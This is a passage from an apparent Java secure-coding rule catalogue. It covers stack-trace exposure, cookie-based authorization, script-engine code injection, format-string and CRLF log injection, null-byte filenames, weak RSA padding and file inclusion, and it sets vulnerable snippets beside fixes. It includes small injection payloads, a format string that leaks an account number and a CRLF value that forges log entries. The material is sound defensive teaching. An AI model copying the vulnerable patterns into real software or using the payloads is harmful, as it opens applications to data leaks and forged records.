</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The application server’s configuration allows detailed error messages, e.g. stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Do not reveal stack traces.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
  <span class="k">try</span><span class="o">{</span>
    <span class="o">...</span>
    <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">Logger</span> <span class="n">log</span> <span class="o">=</span> <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="s">"lavasoft"</span><span class="o">);</span>  
      <span class="n">log</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Level</span><span class="o">.</span><span class="na">INFO</span><span class="o">,</span> <span class="s">"dfsf"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">finally</span><span class="o">{</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The exception message e is exposed in the log.</p>
<h3 id="fixed-code-example">Fixed code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
  <span class="k">try</span><span class="o">{</span>
    <span class="o">...</span>
    <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">Logger</span> <span class="n">log</span> <span class="o">=</span> <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="s">"lavasoft"</span><span class="o">);</span>  
      <span class="n">log</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Level</span><span class="o">.</span><span class="na">INFO</span><span class="o">,</span> <span class="s">"dfsf"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">finally</span><span class="o">{</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Remove the exception message e.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE">
<p>https://cwe.mitre.org/data/definitions/200.html <a class="footnote-backref" href="#fnref-CWE" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0092">Reliance on Untrusted Inputs in a Security Decision</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</p>
<p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ol>
<li>Store state information and sensitive data on the server side only.  </li>
<li>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server. </li>
<li>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</li>
</ol>
<p>Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following code excerpt reads a value from a browser cookie to determine the role of the user.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"role"</span><span class="o">))</span> <span class="o">{</span>
    <span class="n">userRole</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"authenticated"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
  <span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">()))</span> <span class="o">{</span>
    <span class="n">authenticated</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>How to fix: See "Potential Mitigations"</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE807">
<p>http://cwe.mitre.org/data/definitions/807.html <a class="footnote-backref" href="#fnref-CWE807" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-807.html">CWE-807</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7537">Hazelcast symmetric encryption</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Hazelcast symmetric encryption</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The network communications for Hazelcast is configured to use a symmetric cipher (probably DES or blowfish).</p>
<p>Those ciphers alone do not provide integrity or secure authentication. The use of asymmetric encryption is preferred.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://projects.webappsec.org/w/page/13246945/Insufficient%20Transport%20Layer%20Protection">WASC-04: Insufficient Transport Layer Protection</a><br/>
<a href="http://docs.hazelcast.org/docs/3.5/manual/html/encryption.html">Hazelcast Documentation: Encryption</a><br/>
<a href="http://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1080">Dynamic Code Evaluation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Code injection can occur when untrusted input is injected into dynamically constructed code. One obvious source of potential vulnerabilities is the use of JavaScript from Java code. The javax.script package consists of interfaces and classes that define Java scripting engines and a framework for the use of those interfaces and classes in Java code. Misuse of the javax.script API permits an attacker to execute arbitrary code on the target system.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Take care interpreting untrusted code.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example incorporates untrusted user input into a JavaScript statement that is responsible for printing the input:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>The best defense against code injection vulnerabilities is to prevent the inclusion of executable user input in code. User input used in dynamic code must be sanitized, for example, to ensure that it contains only valid, whitelisted characters:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="c1">// Allow only alphanumeric and underscore chars in firstName</span>
  <span class="c1">// (modify if firstName may also include special characters)</span>
  <span class="k">if</span> <span class="o">(!</span><span class="n">firstName</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
    <span class="c1">// String does not match whitelisted characters</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">();</span>
  <span class="o">}</span>

  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS52-J.+Prevent+code+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7468">Format String Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Format String Manipulation</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Allowing user input to control format parameters could enable an attacker to cause exceptions to be thrown or leak information.<br/>
Attackers may be able to modify the format string argument, such that an exception is thrown. If this exception is left uncaught, it may crash the application. Alternatively, if sensitive information is used within the unused arguments, attackers may change the format string to reveal this information.<br/>
The example code below lets the user specify the decimal points to which it shows the balance. The user can in fact specify anything causing an exception to be thrown which could lead to application failure. Even more critical within this example, if an attacker can specify the user input "2f %3$s %4$.2", the format string would be "The customer: %s %s has the balance %4$.2f %3$s %4$.2". This would then lead to the sensitive accountNo to be included within the resulting string.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>Formatter formatter = new Formatter(Locale.US);
String format = "The customer: %s %s has the balance %4$." + userInput + "f";
formatter.format(format, firstName, lastName, accountNo, balance);</pre>
</p>
<p>
<b>Solution:</b><br/>
Avoid using user controlled values in the format string argument.
</p>
<br/>
<p>
<b>References</b><br/>
<a href="http://cwe.mitre.org/data/definitions/134.html">CWE-134: Use of Externally-Controlled Format String</a><br/>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7496">FilenameUtils not filtering null bytes</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>FilenameUtils not filtering null bytes</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>Some FilenameUtils' methods don't filter NULL bytes (<code>0x00</code>).</p>
<p>If a null byte is injected into a filename, if this filename is passed to the underlying OS, the file retrieved will be the
name of the file that is specified prior to the NULL byte, since at the OS level, all strings are terminated by a null byte even
though Java itself doesn't care about null bytes or treat them special. This OS behavior can be used to bypass filename validation 
that looks at the end of the filename (e.g., endswith ".log") to make sure its a safe file to access.</p>
<p>To fix this, two things are recommended:
<ul>
<li>Upgrade to Java 7 update 40 or later, or Java 8+ since<br/>
<a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846">NULL byte injection in filenames is fixed in those versions</a>.</li>
<li>Strongly validate any filenames provided by untrusted users to make sure they are valid (i.e., don't contain null, don't include path characters, etc.)</li>
</ul>
<p>If you know you are using a modern version of Java immune to NULL byte injection, you can probably disable this rule.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection">WASC-28: Null Byte Injection</a><br>
<a href="http://cwe.mitre.org/data/definitions/158.html">CWE-158: Improper Neutralization of Null Byte or NUL Character</a>
</br></p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7543">RSA with no padding is insecure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>RSA with no padding is insecure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The software uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>Cipher.getInstance("RSA/NONE/NoPadding")</pre>
</p>
<p>
<b>Solution:</b><br/>
The code should be replaced with:<br/>
<pre>Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding")</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://cwe.mitre.org/data/definitions/780.html">CWE-780: Use of RSA Algorithm without OAEP</a><br/>
<a href="http://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/">Root Labs: Why RSA encryption padding is critical</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1093">Dangerous File Inclusion</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#remote-file-inclusion">Remote File Inclusion</a></li>
<li><a href="#local-file-inclusion">Local File Inclusion</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="remote-file-inclusion">Remote File Inclusion</h4>
<p>Remote File Inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.</p>
<h4 id="local-file-inclusion">Local File Inclusion</h4>
<p>Local File Inclusion (LFI) is similar to a Remote File Inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution. This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Avoid passing user-submitted input to any filesystem/framework API.</p>
</li>
<li>
<p>Maintain a white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">&lt;%</span>
   <span class="n">String</span> <span class="n">p</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"p"</span><span class="o">);</span>
   <span class="nd">@include</span> <span class="n">file</span><span class="o">=</span><span class="s">"&lt;%="</span><span class="n">includes</span><span class="o">/</span><span class="s">" + p +"</span><span class="o">.</span><span class="na">jsp</span><span class="err">"</span><span class="k">%&gt;</span>"
%&gt;
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/File_inclusion_vulnerability <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7573">Potential CRLF Injection for logs</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential CRLF Injection for logs</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    When data from an untrusted source is put into a logger and not neutralized correctly,
    an attacker could forge log entries or include malicious content.
    Inserted false entries could be used to skew statistics, distract the administrator
    or even to implicate another party in the commission of a malicious act.
    If the log file is processed automatically, the attacker can render the file unusable
    by corrupting the format of the file or injecting unexpected characters.
    An attacker may also inject code or other commands into the log file and take advantage
    of a vulnerability in the log processing utility (e.g. command injection or XSS).
</p>
<br/>
<p>
<b>Code at risk:</b><br/>
<pre>String val = request.getParameter("user");
String metadata = request.getParameter("metadata");
[...]
if(authenticated) {
    log.info("User " + val + " (" + metadata + ") was authenticated successfully");
}
else {
    log.info("User " + val + " (" + metadata + ") was not authenticated");
}
</pre></p>
<p>A malicious user could send the metadata parameter with the value: <code>"Firefox) was authenticated successfully\r\n[INFO] User bbb (Internet Explorer"</code>.
</p></p>
<p><b>Solution:</b><br/>
<p>
You can manually sanitize each parameter.
<pre>
log.info("User " + val.replaceAll("[\r\n]","") + " (" + userAgent.replaceAll("[\r\n]","") + ") was not authenticated");
</pre>
</p></p>
<p>
You can also configure your logger service to replace new line for all message events. Here is sample configuration for LogBack <a href="https://logback.qos.ch/manual/layouts.html#replace">using the replace function</a>.
<pre>
&lt;pattern&gt;%-5level - %replace(%msg){'[\r\n]', ''}%n&lt;/pattern&gt;
</pre>
</p>
<p>
Finally, you can use a logger implementation that replace new line by spaces.
The project <a href="https://github.com/javabeanz/owasp-security-logging">OWASP Security Logging</a> has an implementation for Logback and Log4j.
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://cwe.mitre.org/data/definitions/117.html">CWE-117: Improper Output Neutralization for Logs</a><br/>
<a href="http://cwe.mitre.org/data/definitions/93.html">CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')</a><br/>
<a href="https://logback.qos.ch/manual/layouts.html#replace">CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')</a><br/>
<a href="https://github.com/javabeanz/owasp-security-logging">OWASP Security Logging</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
